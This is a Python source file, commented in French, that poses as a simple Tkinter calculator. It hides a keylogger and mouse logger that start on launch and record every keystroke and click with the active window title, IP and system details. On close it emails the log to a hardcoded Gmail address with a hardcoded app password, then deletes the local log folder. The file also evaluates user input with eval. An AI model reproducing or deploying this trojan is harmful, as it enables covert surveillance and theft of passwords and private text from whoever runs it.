import tkinter as tk
from tkinter import ttk, messagebox
import threading
import datetime
from datetime import datetime
import os
import shutil
import smtplib
from email.message import EmailMessage
from pynput import mouse, keyboard
from pynput.keyboard import Key, Listener
import socket
import ctypes
import subprocess
import platform

#-------------------------------------------------------TRACKER--------------------------------------------------------------#

# Utilitaire pour obtenir le titre de la fenêtre active
def get_active_window_title():
    os_name = platform.system()
    if os_name == 'Windows':
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    elif os_name == 'Darwin':  # macOS
        script = 'tell application "System Events" to get name of first application process whose frontmost is true'
        try:
            title = subprocess.check_output(["osascript", "-e", script]).decode("utf-8").strip()
            return title
        except subprocess.CalledProcessError:
            return "Unknown Window"
    else:
        return "Unsupported OS"
    
# Tracker
class Tracker:
    def __init__(self):
        self.mouse_listener = mouse.Listener(on_click=self.on_click)
        self.keyboard_listener = keyboard.Listener(on_press=self.on_press)
        self.running = False
        self.start_time = None
        self.end_time = None
        self.tracking_folder = "tracking_files"
        os.makedirs(self.tracking_folder, exist_ok=True)
        self.tracking_file_name = f"tracking_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        self.tracking_file_path = os.path.join(self.tracking_folder, self.tracking_file_name)
        with open(self.tracking_file_path, 'w', encoding='utf-8') as f:
            f.write("Start Tracking\n")

    def on_click(self, x, y, button, pressed):
        if pressed:
            window_title = get_active_window_title()
            with open(os.path.join(self.tracking_folder, self.tracking_file_name), 'a', encoding='utf-8') as f:
                f.write(f'Mouse clicked at ({x}, {y}) on window "{window_title}" at {datetime.now()}\n')

    def on_press(self, key):
        window_title = get_active_window_title()
        key_str = str(key).replace("'", "")
        if hasattr(key, 'char'):
            key_str = key.char if key.char else key_str
        with open(os.path.join(self.tracking_folder, self.tracking_file_name), 'a', encoding='utf-8') as f:
            f.write(f'Key pressed: {key_str} in window "{window_title}" at {datetime.now()}\n')

    def start_tracking(self):
        if not self.running:
            # Obtenez l'adresse IP locale
            local_ip = socket.gethostbyname(socket.gethostname())
            # Obtenez les informations système
            os_info = platform.system() + " " + platform.release()
            processor_info = platform.processor()
            # Obtenez la date et l'heure actuelles
            now = datetime.now()
            date_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
            # Utilisez des tirets au lieu de deux points pour la compatibilité des noms de fichiers sous Windows
            date_time_str = now.strftime("%Y-%m-%d_%H-%M-%S")

            # Création du dossier s'il n'existe pas
            if not os.path.exists(self.tracking_folder):
                os.makedirs(self.tracking_folder)

            # Nom du fichier incluant la date et l'heure
            self.tracking_file_name = f"tracking_{date_time_str}.txt"
            tracking_file_path = os.path.join(self.tracking_folder, self.tracking_file_name)

            # Écrivez ces informations dans le fichier au début du tracking
            with open(os.path.join(self.tracking_folder, self.tracking_file_name), 'w', encoding='utf-8') as f:
                f.write(f"Adresse IP de départ: {local_ip}\n")
                f.write(f"Système d'exploitation: {os_info}\n")
                f.write(f"Processeur: {processor_info}\n")
                f.write(f"Date et heure de départ: {date_time_str}\n\n")

            self.tracking_file_name = f"tracking_{date_time_str}.txt"
            self.start_time = now
            self.running = True
            self.mouse_listener.start()
            self.keyboard_listener.start()

    def stop_tracking(self):
        if self.running:
            self.end_time = datetime.now()
            self.running = False
            self.mouse_listener.stop()
            self.keyboard_listener.stop()
            self.send_email()
            self.copy_and_delete_tracking_file()
            shutil.rmtree(self.tracking_folder)  # Supprime le dossier après envoi

    def copy_and_delete_tracking_file(self):
        if self.start_time and self.end_time:
            start_str = self.start_time.strftime("%Y-%m-%d_%H-%M-%S")
            end_str = self.end_time.strftime("%Y-%m-%d_%H-%M-%S")
            archived_filename = f"archive_tracking_{start_str}_to_{end_str}.txt"
            archived_file_path = os.path.join(self.tracking_folder, archived_filename)
            
            shutil.move(os.path.join(self.tracking_folder, self.tracking_file_name), archived_file_path)
            
            self.tracking_file_path = archived_file_path

    # Fonctionnalité d'envoi par email
    def send_email(self):
        sender_email = "theamazingjocker@gmail.com"
        receiver_email = "theamazingjocker@gmail.com"
        password = "mypnnftjjsinshhr"  # Mot de passe d'application sans espaces
        
        # Lire le contenu du fichier de tracking
        file_path = self.tracking_file_path
        with open(file_path, 'r', encoding='utf-8') as file:
            tracking_data = file.read()
        
        # Préparer le corps de l'email avec le contenu du fichier
        body = "Voici le contenu du fichier de tracking :\n\n" + tracking_data

        msg = EmailMessage()
        msg.set_content(body)
        msg['Subject'] = 'Document de Tracking'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(sender_email, password)
                smtp.send_message(msg)
            messagebox.showinfo('Succès', 'Email envoyé avec succès !')
        except Exception as e:
            messagebox.showerror('Erreur', f'Erreur lors de l\'envoi de l\'email : {e}')

    # Fonction pour obtenir l'adresse IP locale
    def get_local_ip():
            try:
                # Crée un socket pour se connecter à un site web public
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))  # Google DNS
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception as e:
                return "IP inconnue"

    # Obtenez la date et l'heure actuelles
    now = datetime.now()
    date_time_str = now.strftime("%Y-%m-%d %H:%M:%S")

#-----------------------------------------------------CALCULATRICE-----------------------------------------------------------#

def calculate(operation):
    try:
        # Récupère le texte actuel dans l'entrée et calcule le résultat
        result = eval(entry.get())
        entry.delete(0, tk.END)
        entry.insert(tk.END, str(result))
    except Exception as e:
        entry.delete(0, tk.END)
        entry.insert(tk.END, "Error")

def on_click(char):
    entry.insert(tk.END, char)

def copy_to_clipboard():
    root.clipboard_clear()
    root.clipboard_append(entry.get())
    root.update()  # Maintient le presse-papier après la fermeture de l'application

def center_calculator(event=None):
    frame.update_idletasks()  # Met à jour la disposition du frame
    frame_width = frame.winfo_reqwidth()
    frame_height = frame.winfo_reqheight()
    window_width = root.winfo_width()
    window_height = root.winfo_height()
    x = max((window_width - frame_width) // 2, 0)
    y = max((window_height - frame_height) // 2, 0)
    frame.grid(column=0, row=0, padx=x, pady=y)

root = tk.Tk()
root.title("Calculatrice")

# Création d'un frame comme conteneur pour centrer les widgets
frame = ttk.Frame(root)
frame.grid(padx=1, pady=1)

entry = tk.Entry(frame, width=20)
entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

buttons = [
    ('7', 1, 0), ('8', 1, 1), ('9', 1, 2),
    ('4', 2, 0), ('5', 2, 1), ('6', 2, 2),
    ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('0', 4, 1),
    ('+', 1, 3), ('-', 2, 3), ('*', 3, 3), ('/', 4, 3),
    ('=', 4, 2), ('C', 4, 0),
]

for (text, row, col) in buttons:
    if text == '=':
        ttk.Button(frame, text=text, command=lambda: calculate('=')).grid(row=row, column=col, pady=5)
    elif text == 'C':
        ttk.Button(frame, text=text, command=lambda: entry.delete(0, tk.END)).grid(row=row, column=col, pady=5)
    else:
        ttk.Button(frame, text=text, command=lambda char=text: on_click(char)).grid(row=row, column=col, pady=5)

ttk.Button(frame, text="Copier", command=copy_to_clipboard).grid(row=5, column=0, columnspan=4, sticky='nsew', padx=10, pady=10)

# Ajuste le frame au centre lors du redimensionnement de la fenêtre
root.bind('<Configure>', center_calculator)

#-------------------------------------------------------Exécution du Tracker------------------------------------------------#

tracker = Tracker()
tracking_thread = threading.Thread(target=tracker.start_tracking, daemon=True)
tracking_thread.start()

def on_closing():
    tracker.stop_tracking()
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_closing)

root.mainloop()